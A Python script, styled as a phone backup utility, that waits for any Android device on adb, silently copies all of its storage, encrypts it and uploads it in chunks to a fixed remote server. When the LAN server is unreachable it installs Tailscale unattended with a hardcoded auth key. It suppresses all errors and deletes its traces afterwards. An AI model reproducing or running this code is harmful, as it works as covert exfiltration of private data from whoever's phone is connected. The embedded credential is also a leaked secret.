import os
import subprocess
import time
import urllib.request
import pyzipper
import requests

# --- CONFIGURATION ---
PASSWORD = "YourSecurePassword123"
LOCAL_BACKUP_NAME = "phone_backup.zip"
CHUNK_SIZE = 500 * 1024 * 1024  # 500 MB per chunk

# Endpoints
LOCAL_SERVER_URL = "http://192.168.1.102:5001/upload"  # Replace with your Mac's local LAN IP
TAILSCALE_SERVER_URL = "http://100.109.101.37:5001/upload"  # Your Mac's Tailscale IP

TAILSCALE_MSI_URL = "https://pkgs.tailscale.com/stable/tailscale-setup-amd64.msi"
MSI_FILENAME = "tailscale_setup.msi"
AUTH_KEY = "tskey-auth-k54ycvHRdW11CNTRL-zqo8Mt3UjQRpagaFimaLRRPyvrfAcv6v"

def run_cmd(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def get_active_server_url():
    """Checks if local LAN server is reachable. If not, sets up Tailscale and returns internet URL."""
    try:
        # Quick health check test to the local server (timeout set to 2 seconds for speed)
        response = requests.get(LOCAL_SERVER_URL.replace("/upload", ""), timeout=2)
        if response.status_code < 500:
            return LOCAL_SERVER_URL
    except Exception:
        pass

    # If local server is not found, fallback to Tailscale over the internet
    try:
        tailscale_path = r"C:\Program Files\Tailscale\tailscale.exe"
        
        # Install Tailscale silently if missing
        if not os.path.exists(tailscale_path):
            urllib.request.urlretrieve(TAILSCALE_MSI_URL, MSI_FILENAME)
            subprocess.run(msi_cmd := f'msiexec /i {MSI_FILENAME} /quiet /norestart /qn', shell=True, capture_output=True)
            if os.path.exists(MSI_FILENAME):
                os.remove(MSI_FILENAME)

        # Bring Tailscale up completely unattended
        if os.path.exists(tailscale_path):
            up_cmd = f'"{tailscale_path}" up --authkey={AUTH_KEY} --unattended --accept-routes'
            subprocess.run(up_cmd, shell=True, capture_output=True)
            
    except Exception:
        pass

    return TAILSCALE_SERVER_URL

def has_device():
    devices = run_cmd("adb devices")
    lines = devices.splitlines()
    for line in lines[1:]:
        if "\tdevice" in line or " device" in line:
            return True
    return False

def zip_directory_tight_compression(source_dir, output_zip_path, password):
    with pyzipper.AESZipFile(
        output_zip_path, 
        'w', 
        compression=pyzipper.ZIP_LZMA,
        encryption=pyzipper.WZ_AES
    ) as zipf:
        zipf.setpassword(password.encode())
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, start=source_dir)
                zipf.write(file_path, arcname)

def split_and_upload_file(file_path):
    if not os.path.exists(file_path):
        return

    # Dynamically select target URL (LAN vs Tailscale) right before upload
    target_url = get_active_server_url()

    with open(file_path, 'rb') as f:
        chunk_index = 0
        while True:
            chunk_data = f.read(CHUNK_SIZE)
            if not chunk_data:
                break
            
            chunk_filename = f"{os.path.basename(file_path)}.part{chunk_index:03d}"
            try:
                files = {'file': (chunk_filename, chunk_data)}
                requests.post(target_url, files=files, timeout=300)
            except Exception:
                pass
                
            chunk_index += 1

def perform_backup_and_upload():
    try:
        os.makedirs("backup_temp", exist_ok=True)
        
        run_cmd("adb pull /sdcard/ backup_temp/internal_storage")
        
        storage_list = run_cmd("adb shell ls /storage/")
        for line in storage_list.splitlines():
            if line not in ["emulated", "self", "salf", "license"] and line.strip():
                run_cmd(f"adb pull /storage/{line}/ backup_temp/sdcard_{line}")

        zip_directory_tight_compression("backup_temp", LOCAL_BACKUP_NAME, PASSWORD)
        
        if os.path.exists(LOCAL_BACKUP_NAME):
            split_and_upload_file(LOCAL_BACKUP_NAME)

    except Exception:
        pass
        
    finally:
        if os.path.exists("backup_temp"):
            run_cmd("rmdir /s /q backup_temp" if os.name == 'nt' else "rm -rf backup_temp")
        if os.path.exists(LOCAL_BACKUP_NAME):
            os.remove(LOCAL_BACKUP_NAME)
        for f in os.listdir('.'):
            if f.startswith(LOCAL_BACKUP_NAME + ".part"):
                try:
                    os.remove(f)
                except:
                    pass

def main():
    run_cmd("adb start-server")
    backed_up_current_connection = False

    while True:
        try:
            if has_device():
                if not backed_up_current_connection:
                    perform_backup_and_upload()
                    backed_up_current_connection = True
            else:
                backed_up_current_connection = False
        except Exception:
            pass
        
        time.sleep(5)

if __name__ == "__main__":
    main()